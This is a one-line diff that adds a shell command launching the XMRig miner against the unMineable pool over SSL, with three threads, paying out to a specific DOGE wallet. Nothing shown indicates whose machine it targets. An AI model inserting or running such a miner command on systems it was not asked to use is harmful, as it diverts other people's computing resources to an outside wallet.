@@ -1,0 +1,1 @@
+./xmrig -a rx -o stratum+ssl://rx-eu.unmineable.com:443 -t 3 -u DOGE:D81HTnxgozMDXkvMZpHENgtXyzShc7ngBQ.unmin_doge_01 -p x
